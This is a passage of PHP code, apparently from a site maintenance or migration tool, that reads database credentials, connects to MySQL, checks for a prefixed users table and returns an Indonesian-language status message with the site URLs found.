    $cfg = ba_get_db_config($base, $manual);
    if (!$cfg['ok']) {
        return $cfg;
    }
    $conn = ba_connect($cfg['db']);
    if (!$conn['ok']) {
        return $conn;
    }
    $m = $conn['mysqli'];
    $pref = $cfg['prefix'];
    $tbl = $pref . 'users';
    $rs = @$m->query("SHOW TABLES LIKE '" . $m->real_escape_string($tbl) . "'");
    $has = ($rs && $rs->num_rows > 0);
    $urls = $has ? ba_urls_from_db($m, $pref) : array();
    $m->close();
    if (!$has) {
        return array('ok' => false, 'msg' => 'Tabel ' . $tbl . ' tidak ditemukan (prefix salah?)');
    }
    return array(
        'ok'   => true,
        'msg'  => 'Database OK — tabel ' . $tbl . ' ditemukan' . (!empty($cfg['source']) && $cfg['source'] === 'manual' ? ' (kredensial manual)' : ''),
        'db'   => $cfg['db']['name'],
        'host' => $cfg['db']['host'],
        'pref' => $pref,
        'urls' => $urls,
    );
}

